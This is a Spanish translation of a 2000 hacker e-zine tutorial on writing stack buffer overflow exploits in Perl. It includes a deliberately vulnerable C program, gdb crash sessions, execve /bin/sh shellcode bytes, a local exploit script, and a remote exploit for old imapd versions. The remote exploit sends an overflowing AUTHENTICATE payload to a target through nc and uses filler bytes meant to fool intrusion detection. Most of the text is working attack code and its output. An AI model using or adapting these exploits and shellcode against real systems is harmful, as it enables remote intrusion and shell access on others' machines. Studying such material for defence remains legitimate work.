@@ -1,0 +1,405 @@
+
+
+                  -+-| DisidentS Hack Journal #3 |-+-
+
+
+
+
+
+
+  __________________________________________________________________________
+ |                                                                          |
+ |  -+- Titulo_____: Buffer Overflows en Perl [007.txt]                     |
+ |  -+- Autor______: Taseh (traduccion).                                    |
+ |  -+- E-Mail_____: <taseh@gmx.net>                                        |
+ |  -+- Team_______: DisidentS España - http://www.disidents.int-ltd.com    |
+ |  -+- KB_________: 15.6                                                   |
+ |  -+- Tema_______: Artesania                                              |
+ |__________________________________________________________________________|
+
+
+
+            -- Buffer Overflow Exploits en Perl - año 2000 --
+             <teleh0r@doglover.com> - http://teleh0r.cjb.net/
+          _____________________________________________________
+         |                                                     |
+         |  Traducido al castellano por Taseh <taseh@gmx.net>  |
+         |_____________________________________________________| 
+ 
+   ===================================================================
+.==========================================================================.
+|===========~ INDICE ~======================================================
+|===========================================================================
+|=~ 1 - Introduccion                                                       |
+|=~ 2 - Ejemplo de programa vulnerable                                     |
+|=~ 3 - Shellcode                                                          |
+|=~ 4 - Diseño del payload                                                 |
+|=~ 5 - Explicacion de un ejemplo de Exploit                               |
+|=~ 6 - Enlaces y recursos.                                                |
+|=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=.
+======================================================~ INDICE ~============
+========================================================================== 
+-----------------------------------------------------------------------------
+
+
+
+.==========================================================================.
+|=======~ 1 INTRODUCCION ~==================================================
+|===========================================================================
+
+
+Este texto es para aquellos que buscan una manera practica de aprender a es-
+cribir exploits buffer overflow. Como el titulo dice, este texto te enseña a
+escribir esos exploits en perl.
+
+Si lo que buscas es un texto mas profundo, por favor, echale un ojo a los e-
+nlaces que he puesto al final del texto y leelos en lugar de leer este.
+
+
+
+
+
+.==========================================================================.
+|=======~ 2 Ejemplo de programa vulnerable ~===============================
+|===========================================================================
+ 
+Un hueco para un ejemplo. Escribi un pequeño programa que es vulnerable a un
+buffer overflow. strcp() no chequea el tamaño de $KIDVULN antes de iniciarse 
+poniendo estos datos en la pila, de este modo vamos a hacer el programa exp-
+lotable.
+
+-----------------------------------------------------------------------------
+<++> vuln.c
+
+#include <stdio.h>
+int main() {
+  char kidbuffer[1024];
+
+  if (getenv("KIDVULN") == NULL) {
+    fprintf(stderr, "Grow up!\n");
+    exit(1);
+  }
+
+  /* Lee la variable de entorno en el buffer */
+  strcpy(kidbuffer, (char *)getenv("KIDVULN"));
+
+  printf("La variable de entorno KIDVULN es:\n\"%s\".\n\n", kidbuffer);
+  printf("No es la vida maravillosa en una guarderia?\n");
+  return 0;
+}
+
+<--> fin
+-----------------------------------------------------------------------------
+
+[root@localhost teleh0r]# gcc -o vuln vuln.c
+vuln.c: In function `main':
+vuln.c:5: warning: comparison between pointer and integer
+[root@localhost teleh0r]# export KIDVULN=`perl -e '{print "A"x"1028"}'`
+[root@localhost teleh0r]# gdb vuln
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) r
+Starting program: /home/teleh0r/vuln
+La variable de entorno KIDVULN es:
+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<snip>
+
+No es la vida maravillosa en una guarderia?
+
+Program received signal SIGSEGV, Segmentation fault.
+0x40032902 in __libc_start_main (main=Cannot access memory at address 0x41414149
+) at ../sysdeps/generic/libc-start.c:61
+61      ../sysdeps/generic/libc-start.c: No such file or directory.
+(gdb)
+
+-----------------------------------------------------------------------------
+
+Aqui podemos ver que el tamaño del buffer no es lo bastante grande. Seria ah-
+ora, cuando el puntero de la pila es sobreescrito y el registro EIP tendra a-
+hora 0x41414141. (41 == A en hexadecimal).
+
+-----------------------------------------------------------------------------
+
+[root@localhost teleh0r]# export KIDVULN=`perl -e '{print "A"x"1032"}'`
+[root@localhost teleh0r]# gdb vuln
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) r
+Starting program: /home/teleh0r/vuln
+La variable de entorno KIDVULN es:
+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<snip>
+
+No es la vida maravillosa en una guarderia?
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb)
+
+-----------------------------------------------------------------------------
+
+Aqui tenemos totalmente sobreescrita la vieja direccion de retorno. Vemos co-
+mo los 4 A's.Que hace este en medio? Bien, podemos tener el control donde EIP
+señala, y por lo tanto, podemos conseguir EIP para señalar nuestra payload.
+Si esto es cierto, nuestro codigo sera ejecutado en la pila.
+
+(Algunos sistemas operativos/parches previenen de que el codigo empiece a ser
+ejecutado en la pila).
+
+-----------------------------------------------------------------------------
+
+Ahora sabemos la longitud que usaremos para reescribir completamente la
+sentencia de retorno. Puesto que ESP señala a lo mas alto de la pila, podemos
+usar el valor de ESP cuando el programa muera, y (si es necesario) añadirle el
+offset.
+
+Asi es como puedes sacar el valor del puntero de pila para usar en el exploit.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info reg esp
+esp            0xbffff770       -1073744064
+(gdb)
+
+-----------------------------------------------------------------------------
+
+
+
+.==========================================================================.
+|=======~ 3 Shellcode ~=====================================================
+|===========================================================================
+ 
+
+Si lo que quieres es aprender a escribir tu propia shellcode,por favor, mira
+los enlaces que he puesto al final del texto. Si eres perezoso y solo progr-
+amas en Perl, los cambios son duros, puedes usar herramientas que  hacen  la 
+shellcode por ti.Hellkit y execve-shell son dos buenos ejemplos de este tipo 
+de programas.(grandes  utilidades)
+
+(Puedes encontrar estas utilidades en: http://teso.scene.at/)
+
+[root@localhost execve-shell]# ./shellxp /bin/sh
+build exploit shellcode
+-scut / teso.
+
+construyendo shellcode...
+
+[ 39/2048] adding ( 7): /bin/sh
+tamaño de la shellcode: 47 bytes
+
+/* shellcode de 47 bytes */
+"\xeb\x1f\x5f\x89\xfc\x66\xf7\xd4\x31\xc0\x8a\x07"
+"\x47\x57\xae\x75\xfd\x88\x67\xff\x48\x75\xf6\x5b"
+"\x53\x50\x5a\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff"
+"\xff\xff\x01\x2f\x62\x69\x6e\x2f\x73\x68\x01";
+
+----------------------------------------------------------------------------
+
+.==========================================================================.
+|=======~ 4 Diseñando el payload ~==========================================
+|===========================================================================
+ 
+
+[ Nota de traduccion: Payload = Mecanismo que hace que algo actue.mas o meno
+ XDD. ]
+
+El payload sera almacenado en el $buffer scalar, con  los  datos  que  seran 
+necesitados para la explotacion. Tendra la longitud necesaria para sobreesc-
+ribir completamente la vieja sentencia de retorno. Insertaremos  este codigo 
+en el programa apuntado (user-input) para cambiar su flujo.
+
+En la mayoria de los casos el payload es parecido a esto:
+
+N = NOP (0x90) / S = Shellcode / R = ESP (+ offset).
+
+Buffer: [ NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNSSSSSSSRRRRRRRRRRRRRR ]
+
+Hay varias razones por las quue construimos el buffer de esta manera. Primero,
+tenemos muchos NOPs, despues, la shellcode(que en este ejemplo ejecuta /bin/sh) 
+y por ultimo, el ESP mas el valor del offset.
+
+El registro EIP sera cargado con el valor apuntando a se ESP. Entonces ESP
+apuntara a alguna parte en los NOPs, los nops no haran "ninguna operacion", y
+continuaran no haciendo nada hasta que el procesador llega a la shellcode y
+la ejecuta. (Mira el dibujo de abajo)
+
+	_______________________________________________
+<---- |[ NNNNNNNNNNNNNNNNNNNNNNNNNNN-SHELLCODE-RRRRRRR ]| <----
+	 \_________________________/ ---->   #	  ^
+ 	         ^ 	        		  |
+	 	 |________________________________|
+
+
+Si el buffer que estamos probando para overflow es demasiado pequeño 
+para añadir una cantidad considerable de NOP's, la shellcode y los RET's,
+abajo, el ejemplo podria ser utilizado para construir el payload. 
+(Podriamos haber añadido el nop y la shellcode a la shell-variable tambien)
+
+(R = Puntero de pila + Offset / S = Shellcode / N = x86 NOP)
+
+           / ESP + offset /  NOP's /  Shellcode
+Payload: [ RRRRRRRRRRRRRRRNNNNNNNNNNNNNNNNNNSSSSSS ]
+                      |          |   ----------> #
+                       ----------
+
+(Nota: El buffer no contiene bytes NULL!)
+
+----------------------------------------------------------------------------
+
+
+.==========================================================================.
+|=======~ 5  Ejemplo explicado de exploit ~=================================
+|===========================================================================
+Ejemplo de un viejo exploit remoto para Imapd:
+
+#!/usr/bin/perl
+
+
+$shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89".
+             "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c".
+             "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff".
+             "\xff\xff/bin/sh";
+
+
+$len = 1024 + 8;    # La longitud que necesita tener EIP.
+$ret = 0xbffff770;  # El puntero de pila a la hora de explotar.
+$nop = "\x90";      # x86 NOP
+$offset = -1000;    # Offset por defecto a probar.
+
+
+if (@ARGV == 1) {
+    $offset = $ARGV[0];
+}
+
+for ($i = 0; $i < ($len - length($shellcode) - 100); $i++) {
+    $buffer .= $nop;
+}
+
+# [ Buffer: NNNNNNNNNNNNNN ]
+
+# Añade un puñado de NOPs x86 a el buffer scalar. (885 NOP's)
+
+$buffer .= $shellcode;
+
+# [ Buffer: NNNNNNNNNNNNNNSSSSS ]
+
+# Despues, añadimos la shellcode al buffer. Le hicimos un hueco a la 
+# shellcode arriba.
+
+print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n");
+
+# Aqui añadimos el offset al valor del puntero de pila - lo convierte en
+# hexadecimal, y despues lo imprime.
+
+$new_ret = pack('l', ($ret + $offset));
+
+# 'pack' es una funcion que tomara una lista de valores y la empaketara en
+# una estructura binaria, y despues vuelve a la secuencia que contiene la 
+# estructura. Despues, empaqueta el puntero de pila / ESP + offset en un 
+# signed long - (4 bytes).
+
+for ($i += length($shellcode); $i < $len; $i += 4) {
+    $buffer .= $new_ret;
+}
+
+# [ Buffer: NNNNNNNNNNNNNNNNSSSSSRRRRRR ]
+
+# Aqui añadimos la longitud de la shellcode al scalar $i, antes de que
+# primero, el lazo for acaba teniendo el valor "885" (bytes), despues el lazo 
+# for añade the $new_ret scalar hasta que $buffer tenga el tamaño de 1032 bytes.
+#
+# Tambien podria haberse escrito esto:
+#
+# until (length($buffer) == $len) {
+#    $buffer .= $new_ret;
+#}
+
+local($ENV{'KIDVULN'}) = $buffer; exec("/bin/vuln");
+
+# Copialo en la variable de shell KIDVULN, y ejecuta vuln.
+
+-----------------------------------------------------------------------------
+
+#!/usr/bin/perl
+
+## *** Probado satisfactoriamente en IMAP4rev1 v10.190
+## Escrito por: teleh0r@doglover.com / año 2000
+##
+## Esto no es nuevo - hecho unicamente para la diversion.
+## Vulnerable: imapd versiones 9.0 > 10.223 / CA.
+
+# Shellcode sacada de imapx.c / The Tekneeq Crew
+
+$shellcode ="\xeb\x35\x5e\x80\x46\x01\x30\x80\x46\x02\x30\x80".
+	    "\x46\x03\x30\x80\x46\x05\x30\x80\x46\x06\x30\x89".
+	    "\xf0\x89\x46\x08\x31\xc0\x88\x46\x07\x89\x46\x0c".
+	    "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80".
+	    "\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xc6\xff\xff\xff".
+	    "\x2f\x32\x39\x3e\x2f\x43\x38";
+
+$len = 1052;       # Suficiente para reescribir la sentencia de retorno.
+$nop = A;          # Usando A (0x41) 'como' NOP's para intentar engañar a los IDS.
+$ret = 0xbffff30f; # Sentencia de retorno / ESP / Puntero de pila.
+
+if (@ARGV < 2) {
+    print("Uso: $0 <target> <offset>\n");
+    exit(1);
+}
+
+($target, $offset) = @ARGV;
+
+for ($i = 0; $i < ($len - length($shellcode) - 100); $i++) {
+    $buffer .= $nop;
+}
+
+$buffer .= $shellcode;
+$new_ret = pack('l', ($ret + $offset));
+
+$address = sprintf('%lx', ($ret + $offset));
+print("Address: 0x$address / Offset: $offset / Length: $len\n\n");
+sleep(1);
+
+for ($i += length($shellcode); $i < $len; $i += 4) {
+    $buffer .= $new_ret;
+}
+
+$exploit_string = "* AUTHENTICATE {$len}\015\012$buffer\012";
+
+system("(echo -e \"$exploit_string\" ; cat) | nc $target 143");
+
+-----------------------------------------------------------------------------
+.==========================================================================.
+|=======~ 6   Enlaces y recursos ~==========================================
+|===========================================================================
+
+
+Smashing The Stack For Fun And Profit por Aleph One
+http://phrack.infonexus.com/search.phtml?view&article=p49-14
+
+Escribiendo buffer overflow exploits - Tutorial para novatos.
+http://mixter.warrior2k.com/exploit.txt - Escrito por Mixter.
+
+TESO Security Team - http://teso.scene.at/
+
+*** Fin de traduccion ***
+[ Saludos a todos mis amigos, y hasta la proxima <taseh@gmx.net> ]
